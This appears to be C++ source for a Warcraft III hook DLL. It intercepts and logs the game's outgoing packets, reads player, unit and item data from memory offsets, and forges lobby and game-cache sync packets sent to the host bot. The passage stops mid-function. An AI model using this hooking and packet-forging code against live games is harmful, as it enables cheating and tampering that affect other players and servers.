#define _WIN32_WINNT 0x0501 
#define WINVER 0x0501 
#define NTDDI_VERSION 0x05010000
#define WIN32_LEAN_AND_MEAN
#define PSAPI_VERSION 1
#include <Windows.h>
#include <cstdlib>
#include "MinHook/MinHook.h"
#include <fstream>
#include <string>
#include <sstream>
#include <iostream>
#include <iomanip>
#include <iomanip>
#include <algorithm>
#include <cassert>
#include <cstdlib>
#include <intrin.h>
#include <array>        // std::array
#include <random>       // std::default_random_engine
#include <chrono>       // std::chrono::system_clock

#include <nlohmann/json.hpp>
#include <WinSock2.h>

#include "IniReader.h"
#include "IniWriter.h"

#include "cppcrc.h"

#pragma comment(lib,"ws2_32.lib")

unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();


void WatcherLogAddLine(const std::string line)
{
	std::ofstream outfile("./logFileName_" + std::to_string(GetCurrentThreadId()) + ".log", std::ios_base::app);
	if (!outfile.bad() && outfile.is_open())
		outfile << line;
	outfile.close();
}

std::vector<unsigned char> random16players;

typedef int(__fastcall* pGetFrameItemAddress)(const char* name, int id);
pGetFrameItemAddress GetFrameItemAddress;

std::string hexStr(unsigned char* data, int len)
{
	std::string output = "";
	char tmpbuf[4];
	for (int i = 0; i < len; i++)
	{
		sprintf_s(tmpbuf, "%02X", data[i]);
		output += tmpbuf;
	}
	return output;
}

unsigned char* GameDll = 0;
DWORD MainThread = 0;
HMODULE MainModule = 0;

bool memory_readable(void* ptr, size_t byteCount)
{
	MEMORY_BASIC_INFORMATION mbi;
	if (VirtualQuery(ptr, &mbi, sizeof(MEMORY_BASIC_INFORMATION)) == 0)
		return false;

	if (mbi.State != MEM_COMMIT)
		return false;

	if (mbi.Protect == PAGE_NOACCESS || mbi.Protect == PAGE_EXECUTE)
		return false;

	// This checks that the start of memory block is in the same "region" as the
	// end. If it isn't you "simplify" the problem into checking that the rest of 
	// the memory is readable.
	size_t blockOffset = (size_t)((char*)ptr - (char*)mbi.AllocationBase);
	size_t blockBytesPostPtr = mbi.RegionSize - blockOffset;

	if (blockBytesPostPtr < byteCount)
		return memory_readable((char*)ptr + blockBytesPostPtr,
			byteCount - blockBytesPostPtr);

	return true;
}

struct Packet
{
	DWORD PacketClassPtr;	//+00, some unknown, but needed, Class Pointer
	BYTE* PacketData;		//+04
	DWORD _1;				//+08, zero
	DWORD _2;				//+0C, ??
	DWORD Size;				//+10, size of PacketData
	DWORD _3;				//+14, 0xFFFFFFFF
};



bool GetStringFromStoreIntINGAME(unsigned char* storechar, std::string& hashtable, std::string& outSection, std::string& outKey, int& outval)
{
	if (storechar[0] == 0x6B)
	{
		storechar++;

		unsigned char* endsection = storechar;
		while (storechar[0] != 0x00)
		{
			storechar++;
		}

		hashtable = std::string((char*)endsection, (char*)storechar);
		storechar++;


		endsection = storechar;
		while (endsection[0] != 0x00)
		{
			endsection++;
		}
		outSection = std::string((char*)storechar, (char*)endsection);
		endsection++;
		storechar = endsection;
		endsection = storechar;

		endsection = storechar;
		while (endsection[0] != 0x00)
		{
			endsection++;
		}
		outKey = std::string((char*)storechar, (char*)endsection);
		endsection++;
		storechar = endsection;
		endsection = storechar;

		outval = *(int*)storechar;
		return true;
	}

	return false;
}



typedef void* (__fastcall* GAME_SendPacket_p) (Packet* packet, DWORD zero);
GAME_SendPacket_p GAME_SendPacket;
GAME_SendPacket_p GAME_SendPacket_ptr;


bool ProgramPacket = false;

void* __fastcall GAME_SendPacket_my(Packet* packet, DWORD zero)
{
	int retaddr = (int)_ReturnAddress();

	if (!packet || !memory_readable(packet->PacketData, packet->Size))
	{
		return GAME_SendPacket_ptr(packet, zero);
	}
	char tmpstr[10240];
	if (ProgramPacket)
	{
		WatcherLogAddLine("PROGAMPACKET:");
	}
	else
	{
		if (retaddr > (int)GameDll && retaddr < (int)GameDll + 12582912)
			sprintf_s(tmpstr, "6F%X", retaddr - (int)GameDll);
		else
			sprintf_s(tmpstr, "%X", retaddr);
		WatcherLogAddLine(tmpstr);
	}


	sprintf_s(tmpstr, "->size:%u", packet->Size);
	WatcherLogAddLine(tmpstr);

	sprintf_s(tmpstr, "->data_addr:%X", (DWORD)packet->PacketData);
	WatcherLogAddLine(tmpstr);

	if (memory_readable(packet->PacketData, packet->Size))
	{
		std::string hash;
		std::string sec;
		std::string key;
		int val;
		if (packet->Size > 8 && GetStringFromStoreIntINGAME(packet->PacketData, hash, sec, key, val))
		{
			sprintf_s(tmpstr, "->store:[%s->%s->%s->%i]\n", hash.c_str(), sec.c_str(), key.c_str(), val);
			WatcherLogAddLine(tmpstr);
		}
		else
		{
			sprintf_s(tmpstr, "->data:%s\n", hexStr(packet->PacketData, packet->Size).c_str());
			WatcherLogAddLine(tmpstr);
		}
	}
	else
	{
		sprintf_s(tmpstr, "->NOT READABLED\n");
		WatcherLogAddLine(tmpstr);
	}

	return GAME_SendPacket/*_ptr*/(packet, zero);
}

void SendPacket(BYTE* packetData, DWORD size)
{
	// @warning: this function thread-unsafe, do not use it in other thread.
	// note: this is very useful function, in fact this function
	// does wc3 ingame action, so you can use it for anything you want,
	// including unit commands and and gameplay commands,
	// i suppose its wc3 single action W3GS_INCOMING_ACTION (c) wc3noobpl.

	Packet packet;
	memset(&packet, 0, sizeof(Packet));

	packet.PacketClassPtr = (DWORD)(0x932D2C + GameDll); // Packet Class
	packet.PacketData = packetData;
	packet.Size = size;
	packet._2 = 0x5B4;
	packet._3 = 0xFFFFFFFF;
	GAME_SendPacket = (GAME_SendPacket_p)(GameDll + 0x54D970);
	ProgramPacket = true;
	GAME_SendPacket_my(&packet, 0);
	ProgramPacket = false;
}

int LATEST_GETTICK_RETVAL;



typedef DWORD(__stdcall* GetTickCount_p)();
GetTickCount_p GetTickCount_ptr;


DWORD REALTICKCOUNT = 0;
DWORD OLDREALTICKCOUNT = 0;

DWORD BADTICKCOUNT = 0;

std::string TICK_INI = "./GetTickCount.ini";

CIniWriter tick_writer(TICK_INI.c_str());
CIniReader tick_reader(TICK_INI.c_str());


struct tickstr
{
	unsigned long OLDREALTICK;
	unsigned long NEWREALTICK;
	unsigned long BADTICKCOUNT;
	float savedmult;
	tickstr()
	{
		OLDREALTICK = NEWREALTICK = BADTICKCOUNT = 0;
		savedmult = 1.0f;
	}
};
std::map<int, tickstr> multlist;

#define IsKeyPressed(CODE) ((GetAsyncKeyState(CODE) & 0x8000) > 0)

//std::mutex m;

#include <chrono>

unsigned long start_point = GetTickCount();
unsigned long start_point_latest = 0;
auto t1 = std::chrono::steady_clock::now();

unsigned int quality = 0;

unsigned long
GetTickCount2()
{
	auto t2 = std::chrono::steady_clock::now();
	auto int_ms = std::chrono::duration_cast<std::chrono::milliseconds>(t2 - t1);

	if (int_ms.count() > quality)
	{
		start_point_latest = (unsigned long)int_ms.count();
	}

	return start_point + start_point_latest;
}


DWORD __stdcall GetTickCountMy()
{
	/*int retaddr = (int)_ReturnAddress();
	if (retaddr > (int)GameDll && retaddr < (int)GameDll + 12582912)
	{
		if (MainThread == GetCurrentThreadId())
		{
			//std::lock_guard<std::mutex> l{ m };
			LATEST_GETTICK_RETVAL = retaddr;

			char offset[16];
			sprintf_s(offset, "6F%X", retaddr - (int)GameDll);

			float mult = 1.0f;

			multlist[retaddr - (int)GameDll].OLDREALTICK = multlist[retaddr - (int)GameDll].NEWREALTICK;
			multlist[retaddr - (int)GameDll].NEWREALTICK = GetTickCount2();

			if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
			{
				mult = multlist[retaddr - (int)GameDll].savedmult;
			}
			else
			{
				mult = tick_reader.ReadFloat(offset, "mult", 1.0);
				multlist[retaddr - (int)GameDll].savedmult = mult;
			}

			multlist[retaddr - (int)GameDll].BADTICKCOUNT += (DWORD)((double)(multlist[retaddr - (int)GameDll].NEWREALTICK -
				multlist[retaddr - (int)GameDll].OLDREALTICK) * mult);

			if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
			{

			}
			else
			{
				tick_writer.WriteFloat(offset, "mult", mult);
				if ((multlist[retaddr - (int)GameDll].NEWREALTICK -
					multlist[retaddr - (int)GameDll].OLDREALTICK) > 0 && (multlist[retaddr - (int)GameDll].NEWREALTICK -
						multlist[retaddr - (int)GameDll].OLDREALTICK) < 120000)
				{
					tick_writer.WriteInt(offset, "msec_count", (multlist[retaddr - (int)GameDll].NEWREALTICK -
						multlist[retaddr - (int)GameDll].OLDREALTICK));
				}
			}
			return multlist[retaddr - (int)GameDll].BADTICKCOUNT;

		}
	}*/
	return  GetTickCount2();
}

typedef void(__fastcall* GAME_SendPacketDir2_p) (unsigned char* tcpoffs, unsigned char* packetData, int len);
GAME_SendPacketDir2_p GAME_SendPacketDir2;

int GLOBAL_TCP = 0;

DWORD oldticks = 0;

DWORD bytes_total_sec = 0;

DWORD bytes_per_sec = 0;

DWORD bytes_ticks = 0;

struct testsnddata
{
	unsigned char* tcpstraddr;
	unsigned char* data;
	int len;
};

testsnddata globaltestsnddata;

BOOL foundonestr = FALSE;

typedef void(__fastcall* GAME_SendPacketDir_p) (unsigned char* tcpoffs, unsigned char* zero, unsigned char* packetData, int len);
GAME_SendPacketDir_p GAME_SendPacketDir;
GAME_SendPacketDir_p GAME_SendPacketDir_ptr;

//net_addr sub_6F53E6B0
typedef int(__cdecl* p_6F53E6B0)();
p_6F53E6B0 sub_6F53E6B0;

//0x688F30
typedef int(__fastcall* pGetBnetSockStr)(unsigned char* a1/*&stru_6FAD0090*/, int unk/*zero*/, int net_addr, int a3/*0*/, int* ptr_net_addr, int a5 /*0*/, int a6 /* 1 */);
pGetBnetSockStr GetBnetSockStr;


bool GetStringFromStoreInt(unsigned char* storechar, std::string& hashtable, std::string& outSection, std::string& outKey, int& outval)
{
	if (storechar[0] == 0xF7 && storechar[1] == 0x26 && storechar[8] == 0x6B)
	{
		storechar++;
		storechar++;
		storechar++;
		storechar++;
		storechar++;
		storechar++;
		storechar++;
		storechar++;
		storechar++;

		unsigned char* endsection = storechar;
		while (storechar[0] != 0x00)
		{
			storechar++;
		}

		hashtable = std::string((char*)endsection, (char*)storechar);
		storechar++;


		endsection = storechar;
		while (endsection[0] != 0x00)
		{
			endsection++;
		}
		outSection = std::string((char*)storechar, (char*)endsection);
		endsection++;
		storechar = endsection;
		endsection = storechar;

		endsection = storechar;
		while (endsection[0] != 0x00)
		{
			endsection++;
		}
		outKey = std::string((char*)storechar, (char*)endsection);
		endsection++;
		storechar = endsection;
		endsection = storechar;

		outval = *(int*)storechar;
		return true;
	}

	return false;
}



void __fastcall GAME_SendPacketDir_my(unsigned char* tcpoffs, unsigned char* zero, unsigned char* packetData, int len)
{
	if (!tcpoffs)
		return;
	/*int packretaddr = (int)_ReturnAddress();
	char tmpbuf[512];
	sprintf_s(tmpbuf, 512, "TICKRETADDR:6F%X PACKETRETADDR:6F%X TICK_COUNT:%u (+%ums) [datalen:%u] [bytes/sec:%u]\n", LATEST_GETTICK_RETVAL > 0 ? (LATEST_GETTICK_RETVAL - (int)GameDll) : 0, packretaddr - (int)GameDll, GetTickCount2(), GetTickCount2() - oldticks, len, bytes_per_sec);

	if (!IsKeyPressed(VK_CAPITAL))
		WatcherLogAddLine(tmpbuf);

	bytes_ticks += (GetTickCount2() - oldticks);
	oldticks = GetTickCount2();

	if (bytes_ticks >= 1000)
	{
		bytes_ticks = 0;
		bytes_per_sec = bytes_total_sec;
		bytes_total_sec = 0;
	}

	bytes_total_sec += len;
*/
	int retaddr = (int)_ReturnAddress();

	if (len > 1 && memory_readable(packetData, len))
	{
		if (packetData[1] == 0x27)
		{
			GAME_SendPacketDir_ptr(tcpoffs, (unsigned char*)zero, packetData, len);
			return;
		}
	}
	char tmpstr[10240];
	if (retaddr > (int)GameDll && retaddr < (int)GameDll + 12582912)
		sprintf_s(tmpstr, "6F%X", retaddr - (int)GameDll);
	else
		sprintf_s(tmpstr, "%X", retaddr);
	WatcherLogAddLine(tmpstr);

	sprintf_s(tmpstr, "->size:%u", len);
	WatcherLogAddLine(tmpstr);

	sprintf_s(tmpstr, "->data_addr:%X", (DWORD)packetData);
	WatcherLogAddLine(tmpstr);

	sprintf_s(tmpstr, "->TCP:%X", tcpoffs);
	WatcherLogAddLine(tmpstr);

	if (memory_readable(packetData, len))
	{
		std::string hash;
		std::string sec;
		std::string key;
		int val;
		if (len > 16 && GetStringFromStoreInt(packetData, hash, sec, key, val))
		{
			sprintf_s(tmpstr, "->store:[%s->%s->%s->%i]\n", hash.c_str(), sec.c_str(), key.c_str(), val);
			WatcherLogAddLine(tmpstr);
		}
		else
		{
			sprintf_s(tmpstr, "->data:%s\n", hexStr(packetData, len).c_str());
			WatcherLogAddLine(tmpstr);
		}
	}
	else
	{
		sprintf_s(tmpstr, "->NOT READABLED\n");
		WatcherLogAddLine(tmpstr);
	}

	/*if (len > 2)
	{
		if (packetData[1] == 0x0E)
		{
			if (foundonestr)
				delete[] globaltestsnddata.data;
			globaltestsnddata.tcpstraddr = tcpoffs;
			globaltestsnddata.data = new unsigned char[len];
			globaltestsnddata.len = len;
			memcpy(globaltestsnddata.data, packetData, len);
			foundonestr = TRUE;
		}
	}*/
	//sub_6F6D9C60 closesock func
	//sub_6F6DA650 closesock func
	//sub_6F6DBD20 closesock func
	//sub_6F6DBDB0 closesock func
	//sub_6F6E1700 closesock func
	//sub_6F6E14A0 closesock func
	//
	//6DA720 6DA2C0 ->682E00check->EAX=1->664220->682300->6DA7D0->closesocket
	//
	// 6E00C0->6DFFB0->6DF5F0 new close
	GAME_SendPacketDir_ptr(tcpoffs, (unsigned char*)zero, packetData, len);
}


unsigned char* GetBnetChatSock()
{
	int netaddr = sub_6F53E6B0();
	int bnetChat = GetBnetSockStr(GameDll + 0xAD0090, 0, netaddr, 0, &netaddr, 0, 1);
	if (bnetChat > 0)
	{
		return *(unsigned char**)(bnetChat + 0x414);
	}
	return 0;
}


unsigned char* GetHostBotChatSock()
{
	int hostbotsock = *(int*)(GameDll + 0xACFFA4);
	if (hostbotsock > 0)
	{
		hostbotsock = *(int*)(hostbotsock + 0x148);
		if (hostbotsock > 0)
		{
			return *(unsigned char**)(hostbotsock + 0x3C);
		}
	}
	return 0;
}


void SendData(unsigned char* sockstr, unsigned char header, unsigned char packetid, unsigned char* data, int datalen)
{
	if (!sockstr)
		return;

	std::vector<unsigned char> send_data_buf;
	short totallen = datalen + 4;
	send_data_buf.push_back(header);
	send_data_buf.push_back(packetid);
	send_data_buf.push_back(((unsigned char*)&totallen)[0]);
	send_data_buf.push_back(((unsigned char*)&totallen)[1]);

	for (int i = 0; i < datalen; i++)
	{
		send_data_buf.push_back(data[i]);
	}

	if (sockstr && *(int*)sockstr > 0 && *(int*)(*(int*)sockstr + 44) > 0)
		GAME_SendPacketDir(sockstr, 0, &send_data_buf[0], (int)send_data_buf.size());
}

unsigned char GetLocalPid()
{
	int hostbotsock = *(int*)(GameDll + 0xACFFA4);
	if (hostbotsock > 0)
	{
		hostbotsock = *(int*)(hostbotsock + 0x148);
		if (hostbotsock > 0)
		{
			return *(unsigned char*)(hostbotsock + 0xB4);
		}
	}
	return 0;
}

void SendMapSize(unsigned char flags, unsigned int mapsize)
{
	unsigned char* hostbotsocket = GetHostBotChatSock();
	if (hostbotsocket)
	{
		std::vector<unsigned char> senddata;
		senddata.push_back(((unsigned char*)&mapsize)[0]);
		senddata.push_back(((unsigned char*)&mapsize)[1]);
		senddata.push_back(((unsigned char*)&mapsize)[2]);
		senddata.push_back(((unsigned char*)&mapsize)[3]);
		senddata.push_back(flags);
		senddata.push_back(((unsigned char*)&mapsize)[0]);
		senddata.push_back(((unsigned char*)&mapsize)[1]);
		senddata.push_back(((unsigned char*)&mapsize)[2]);
		senddata.push_back(((unsigned char*)&mapsize)[3]);
		SendData(hostbotsocket, 0xF7, 0x3F, &senddata[0], (int)senddata.size());
	}
}

void StartPongToPing()
{
	unsigned char* hostbotsocket = GetHostBotChatSock();
	if (hostbotsocket)
	{
		unsigned int data = rand();
		std::vector<unsigned char> senddata;
		senddata.push_back(((unsigned char*)&data)[0]);
		senddata.push_back(((unsigned char*)&data)[1]);
		senddata.push_back(((unsigned char*)&data)[2]);
		senddata.push_back(((unsigned char*)&data)[3]);
		SendData(hostbotsocket, 0xF7, 0x46, &senddata[0], (int)senddata.size());
	}
}

void StartMapDownload()
{
	unsigned char* hostbotsocket = GetHostBotChatSock();
	if (hostbotsocket)
	{
		std::vector<unsigned char> senddata;
		SendData(hostbotsocket, 0xF7, 0x3F, &senddata[0], (int)senddata.size());
	}
}

void SendGproxyReconnect()
{
	unsigned char* hostbotsocket = GetHostBotChatSock();
	if (hostbotsocket)
	{
		std::vector<unsigned char> senddata;
		SendData(hostbotsocket, 0xF8, 1, &senddata[0], (int)senddata.size());
	}
}

void StopMapDownload()
{
	unsigned char* hostbotsocket = GetHostBotChatSock();
	if (hostbotsocket)
	{
		std::vector<unsigned char> senddata;
		SendData(hostbotsocket, 0xF7, 0x23, &senddata[0], (int)senddata.size());
	}
}

void ChangeHandicap(unsigned char percent)
{
	unsigned char* hostbotsocket = GetHostBotChatSock();
	if (hostbotsocket)
	{
		std::vector<unsigned char> senddata;
		senddata.push_back(16);
		// msg and flags
		std::shuffle(random16players.begin(), random16players.end(), std::default_random_engine(seed));
		for (auto& id : random16players)
		{
			senddata.push_back(id);
		}
		senddata.push_back(GetLocalPid());
		senddata.push_back(0x14);
		// percent
		senddata.push_back(percent);
		SendData(hostbotsocket, 0xF7, 0x28, &senddata[0], (int)senddata.size());
	}
}


void ChangeTeam(unsigned char team)
{
	unsigned char* hostbotsocket = GetHostBotChatSock();
	if (hostbotsocket)
	{
		//F728090001FF021100
		std::vector<unsigned char> senddata;
		senddata.push_back(16);
		// msg and flags
		std::shuffle(random16players.begin(), random16players.end(), std::default_random_engine(seed));
		for (auto& id : random16players)
		{
			senddata.push_back(id);
		}
		senddata.push_back(GetLocalPid());
		senddata.push_back(0x11);
		// team
		senddata.push_back(team);
		SendData(hostbotsocket, 0xF7, 0x28, &senddata[0], (int)senddata.size());
	}
}

void ChangeColour(unsigned char color)
{
	unsigned char* hostbotsocket = GetHostBotChatSock();
	if (hostbotsocket)
	{
		std::vector<unsigned char> senddata;
		senddata.push_back(16);
		// msg and flags
		std::shuffle(random16players.begin(), random16players.end(), std::default_random_engine(seed));
		for (auto& id : random16players)
		{
			senddata.push_back(id);
		}
		senddata.push_back(GetLocalPid());
		senddata.push_back(0x12);
		// color
		senddata.push_back(color);
		SendData(hostbotsocket, 0xF7, 0x28, &senddata[0], (int)senddata.size());
	}
}

void ChangeExtraFlags(unsigned int flags, std::string msg)
{
	unsigned char* hostbotsocket = GetHostBotChatSock();
	if (hostbotsocket)
	{
		std::vector<unsigned char> senddata;
		senddata.push_back(16);
		// msg and flags
		std::shuffle(random16players.begin(), random16players.end(), std::default_random_engine(seed));
		for (auto& id : random16players)
		{
			senddata.push_back(id);
		}
		senddata.push_back(GetLocalPid());
		senddata.push_back(0x12);
		// flags
		senddata.push_back(((unsigned char*)&flags)[0]);
		senddata.push_back(((unsigned char*)&flags)[1]);
		senddata.push_back(((unsigned char*)&flags)[2]);
		senddata.push_back(((unsigned char*)&flags)[3]);
		for (auto& c : msg)
			senddata.push_back(c);
		senddata.push_back(0x00);


		SendData(hostbotsocket, 0xF7, 0x28, &senddata[0], (int)senddata.size());
	}
}
// sub_6F676C70 (sock?, packid, playerid, toplayeridoffset, toplayeridsize, packeddata, packetsize);
void SendChatMessageBot(const std::string& msg)
{
	unsigned char* hostbotsocket = GetHostBotChatSock();
	if (hostbotsocket)
	{
		std::vector<unsigned char> senddata;
		senddata.push_back(16);
		// msg and flags
		std::shuffle(random16players.begin(), random16players.end(), std::default_random_engine(seed));
		for (auto& id : random16players)
		{
			senddata.push_back(id);
		}
		senddata.push_back(GetLocalPid());
		senddata.push_back(0x10);
		// msg
		for (auto& c : msg)
			senddata.push_back(c);
		senddata.push_back(0x00);

		SendData(hostbotsocket, 0xF7, 0x28, &senddata[0], (int)senddata.size());

		//senddata.clear();
		//senddata.push_back(0x01);
		//// msg and flags
		//senddata.push_back(0x02);
		//senddata.push_back(0x01);
		//senddata.push_back(0x10);
		//// msg
		//for (auto& c : msg)
		//	senddata.push_back(c);
		//senddata.push_back(0x00);

		//SendData(hostbotsocket, 0xF7, 0x0F, &senddata[0], (int)senddata.size());
	}
}

void SendIngameAction(unsigned char* data, int datalen)
{
	unsigned char* hostbotsocket = GetHostBotChatSock();
	if (hostbotsocket)
	{
		int crc32 = 0;
		uint32_t crc_value = CRC32::CRC32::calc(data, datalen);
		std::vector<unsigned char> senddata;
		senddata.push_back(((unsigned char*)&crc_value)[0]);
		senddata.push_back(((unsigned char*)&crc_value)[1]);
		senddata.push_back(((unsigned char*)&crc_value)[2]);
		senddata.push_back(((unsigned char*)&crc_value)[3]);
		for (int i = 0; i < datalen; i++)
		{
			senddata.push_back(data[i]);
		}
		SendData(hostbotsocket, 0xF7, 0x26, &senddata[0], (int)senddata.size());
	}
}

void PrintSockets()
{
	char socks[128];
	sprintf_s(socks, "\n\nBNETCHATSOCKSTR:%X HOSTBOTSOCKSTR:%X\n\n", GetBnetChatSock(), GetHostBotChatSock());
	WatcherLogAddLine(socks);
}


void SendPacketDirectly(BYTE* packetData, DWORD size)
{
	if (GLOBAL_TCP != 0)
	{
		//send(*(int*)(GLOBAL_TCP + 4), (const char*)packetData, size, 0);
		//GAME_SendPacketDir(GLOBAL_TCP, 0, packetData, size);
	}
}



HHOOK hhookSysMsg = 0;

BOOL InGameFound = FALSE;

DWORD StartTime = GetTickCount();


int IsGame()
{
	if (!GameDll)
		return 0;

	unsigned char* _GameUI = GameDll + 0x93631C;
	unsigned char* InGame = GameDll + 0xACE66C;

	return *(unsigned char**)InGame && **(unsigned char***)InGame == _GameUI;
}

DWORD StartTicks = 0;
DWORD PickTicks = 0;
DWORD StartTicks2 = 0;

BOOL RealGameStart = FALSE;

#ifndef _gist_hex2bytes_h
#define _gist_hex2bytes_h

#include <string>
#include <vector>

template<typename T>
std::vector<T> hex2bytes(const std::string& s)
{
	constexpr size_t width = sizeof(T) * 2;
	std::vector<T> v;
	v.reserve((s.size() + width - 1) / width);
	for (auto it = s.crbegin(); it < s.crend(); it += width)
	{
		auto begin = (std::min)(s.crend(), it + width).base();
		auto end = it.base();
		std::string slice(begin, end);
		T value = std::stoul(slice, 0, 16);
		v.push_back(value);
	}
	return v;
}

#endif

void SendSyncDat(const std::string& cache, const std::string& section, const std::string& key, int value)
{
	std::vector<unsigned char> synsArray;


	// A64722e780020202020002020202000FFFFFFFF
	// 

	// SyncStoreInteger
	synsArray.push_back(0x6b);
	// cache (something like dr.x)
	for (auto& c : cache)
	{
		synsArray.push_back(*(unsigned char*)&c);
	}
	synsArray.push_back(0x00);
	// section
	for (auto& c : section)
	{
		synsArray.push_back(*(unsigned char*)&c);
	}
	synsArray.push_back(0x00);
	// key
	for (auto& c : key)
	{
		synsArray.push_back(*(unsigned char*)&c);
	}
	synsArray.push_back(0x00);
	// value
	synsArray.push_back(((unsigned char*)&value)[0]);
	synsArray.push_back(((unsigned char*)&value)[1]);
	synsArray.push_back(((unsigned char*)&value)[2]);
	synsArray.push_back(((unsigned char*)&value)[3]);

	//SendPacketDirectly(synsArray.data(), synsArray.size());
	// 
	//SendIngameAction(synsArray.data(), synsArray.size());
	SendPacket(synsArray.data(), synsArray.size());
}

void SendSyncDat(const std::string& section, const std::string& key, int value)
{
	SendSyncDat("dr.x", section, key, value);
}

void SendSyncDat(const std::string& section, const std::string& key, const std::string& value)
{
	SendSyncDat("dr.x", section, key, atoi(value.c_str()));
}


void SendSyncDatDirect(const std::string& section, const std::string& key, int value)
{
	std::vector<unsigned char> synsArray;


	// A64722e780020202020002020202000FFFFFFFF
	// 

	// SyncStoreInteger
	synsArray.push_back(0x6b);
	// dr.x
	synsArray.push_back(0x64); synsArray.push_back(0x72); synsArray.push_back(0x2e); synsArray.push_back(0x78); synsArray.push_back(0x00);
	// section
	for (auto& c : section)
	{
		synsArray.push_back(*(unsigned char*)&c);
	}
	synsArray.push_back(0x00);
	// key
	for (auto& c : key)
	{
		synsArray.push_back(*(unsigned char*)&c);
	}
	synsArray.push_back(0x00);
	// value
	synsArray.push_back(((unsigned char*)&value)[0]);
	synsArray.push_back(((unsigned char*)&value)[1]);
	synsArray.push_back(((unsigned char*)&value)[2]);
	synsArray.push_back(((unsigned char*)&value)[3]);

	//SendPacketDirectly(synsArray.data(), synsArray.size());
	// 
	SendIngameAction(synsArray.data(), synsArray.size());
	//SendPacket(synsArray.data(), synsArray.size());
}

void SendSyncDatDirect(const std::string& section, const std::string& key, const std::string& value)
{
	SendSyncDatDirect(section, key, atoi(value.c_str()));
}

bool foundgame = false;

unsigned char* pW3XGlobalClass = 0;

int SafeItemCount = 1;
int SafeItemArraySize = 1;
int* SafeItemArray = new int[1] {0};
void FillItemCountAndItemArray()
{
	int GlobalClassOffset = *(int*)(pW3XGlobalClass);
	if (GlobalClassOffset > 0)
	{
		int ItemsOffset1 = *(int*)(GlobalClassOffset + 0x3BC) + 0x10;
		if (ItemsOffset1 > 0)
		{
			int* ItemsCount = (int*)(ItemsOffset1 + 0x604);
			if (ItemsCount
				&& *ItemsCount > 0)
			{
				int* Itemarray = (int*)*(int*)(ItemsOffset1 + 0x608);


				if (SafeItemArraySize < *ItemsCount)
				{
					delete[]SafeItemArray;
					SafeItemArraySize = *ItemsCount;
					SafeItemArray = new int[SafeItemArraySize + 1];
				}
				SafeItemCount = *ItemsCount;
				memcpy(SafeItemArray, Itemarray, 4 * SafeItemCount);
				return;
			}
		}
	}

	memset(SafeItemArray, 0, 4 * SafeItemCount);
}
unsigned char* ItemVtable = 0;
BOOL IsNotBadItem(int itemaddr)
{
	if (itemaddr > 0)
	{
		bool ItemFoundInArray = false;

		for (int i = 0; i < SafeItemCount; i++)
		{
			if (SafeItemArray[i] == itemaddr)
				ItemFoundInArray = true;
		}

		if (ItemFoundInArray)
		{
			int xaddraddr = (int)&ItemVtable;

			if (*(BYTE*)xaddraddr != *(BYTE*)itemaddr)
				return FALSE;
			else if (*(BYTE*)(xaddraddr + 1) != *(BYTE*)(itemaddr + 1))
				return FALSE;
			else if (*(BYTE*)(xaddraddr + 2) != *(BYTE*)(itemaddr + 2))
				return FALSE;
			else if (*(BYTE*)(xaddraddr + 3) != *(BYTE*)(itemaddr + 3))
				return FALSE;

			if (*(int*)(itemaddr + 0x20) & 1)
				return FALSE;

			float hitpoint = *(float*)(itemaddr + 0x58);
			return hitpoint > 0.0f;
		}
	}

	return FALSE;
}



void GetItemLocation3D(int itemaddr, float* x, float* y, float* z)
{
	if (itemaddr)
	{
		int iteminfo = *(int*)(itemaddr + 0x28);
		if (iteminfo)
		{
			*x = *(float*)(iteminfo + 0x88);
			*y = *(float*)(iteminfo + 0x8C);
			//*z = *(float*)(iteminfo + 0x90);
			*z = 0.0f;
		}
		else
		{
			*x = 0.0f;
			*y = 0.0f;
			*z = 0.0f;
		}
	}
	else
	{
		*x = 0.0f;
		*y = 0.0f;
		*z = 0.0f;
	}
}

float Distance3D(float x1, float y1, float z1, float x2, float y2, float z2)
{
	double d[] = { abs((double)x1 - (double)x2), abs((double)y1 - (double)y2), abs((double)z1 - (double)z2) };
	if (d[0] < d[1]) std::swap(d[0], d[1]);
	if (d[0] < d[2]) std::swap(d[0], d[2]);
	return (float)(d[0] * sqrt(1.0 + d[1] / d[0] + d[2] / d[0]));
}

float Distance2D(float x1, float y1, float x2, float y2)
{
	return Distance3D(x1, y1, 1.0f, x2, y2, 1.0f);
}

void GetUnitLocation3D(int unitaddr, float* x, float* y, float* z)
{
	if (unitaddr)
	{
		*x = *(float*)(unitaddr + 0x284);
		*y = *(float*)(unitaddr + 0x288);
		*z = *(float*)(unitaddr + 0x28C);
	}
	else
	{
		*x = 0.0f;
		*y = 0.0f;
		*z = 0.0f;
	}
}

void* GetGlobalPlayerData()
{
	if (*(int*)(0xAB65F4 + GameDll) > 0)
	{
		return (void*)*(int*)(0xAB65F4 + GameDll);
	}
	else
		return nullptr;
}

int GetPlayerByNumber(int number)
{
	if (number == -1)
		return -1;

	void* arg1 = GetGlobalPlayerData();
	int result = -1;
	if (arg1 != nullptr && arg1)
	{
		result = (int)arg1 + (number * 4) + 0x58;
		result = *(int*)result;
	}
	return result;
}

int GetLocalPlayerNumber()
{
	void* gldata = GetGlobalPlayerData();
	if (gldata != nullptr && gldata)
	{
		int playerslotaddr = (int)gldata + 0x28;
		return (int)*(short*)(playerslotaddr);
	}
	else
		return -1;
}


int GetLocalPlayer()
{
	return GetPlayerByNumber(GetLocalPlayerNumber());
}

UINT GetUnitOwnerSlot(int unitaddr)
{
	return *(int*)(unitaddr + 88);
}

int GetPlayerTeam(int playeraddr)
{
	if (playeraddr <= 0)
		return 0;
	return *(int*)(playeraddr + 0x278);
}


int GetSelectedOwnedUnit()
{
	int plr = GetLocalPlayer();
	if (plr != -1 && plr)
	{

		int unitaddr = 0; // = *(int*)((*(int*)plr+0x34)+0x1e0);

		__asm
		{
			MOV EAX, plr;
			MOV ECX, DWORD PTR DS : [EAX + 0x34] ;
			MOV EAX, DWORD PTR DS : [ECX + 0x1E0] ;
			MOV unitaddr, EAX;
		}

		if (unitaddr > 0)
		{
			if (GetUnitOwnerSlot(unitaddr) == GetLocalPlayerNumber())
			{
				return unitaddr;
			}
		}
	}
	return NULL;
}

void __stdcall ItemOrder(int itemaddr_a3, int orderid_a1 = 0xd0003, int unknown_a2 = 0, unsigned int unknown_a4 = 4, unsigned int unknown_a5 = 0)
{
	unsigned char* ItemOrderAddr = GameDll + 0x339D50;
	__asm
	{

		PUSH unknown_a5;
		PUSH unknown_a4;
		PUSH itemaddr_a3;
		PUSH unknown_a2;
		PUSH orderid_a1;
